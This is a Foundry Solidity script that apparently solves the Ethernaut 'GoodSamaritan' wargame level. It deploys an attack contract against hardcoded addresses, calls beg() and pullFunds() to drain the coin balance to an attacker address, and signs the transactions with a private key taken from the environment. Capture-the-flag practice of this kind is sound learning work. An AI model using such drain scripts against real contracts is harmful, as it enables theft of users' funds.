// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";
import "../src/GoodSamaritanHack.sol";

contract GoodSamaritanHackScript is Script {
  Coin public coinContract = Coin(0x3894bA32C5402CF2caCf87e1ab5734C9E6A46bC7);
  Wallet public walletContract = Wallet(0xe15e00dB5Ab18cf0d23d1BD89A4961bc55d794Cd);
  GoodSamaritan public goodSamaritanContract = GoodSamaritan(0x84A759a0Fb9F631A06F0DC5e9465a7fD40eC7ed4);
  GoodSamaritanHack public goodSamaritanHackContract;

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;

    vm.startBroadcast(attacker);
    goodSamaritanHackContract = new GoodSamaritanHack(address(coinContract), address(goodSamaritanContract));

    goodSamaritanHackContract.beg();

    goodSamaritanHackContract.pullFunds();
    console.log(coinContract.balances(attackerAddress));
    vm.stopBroadcast();
  }

}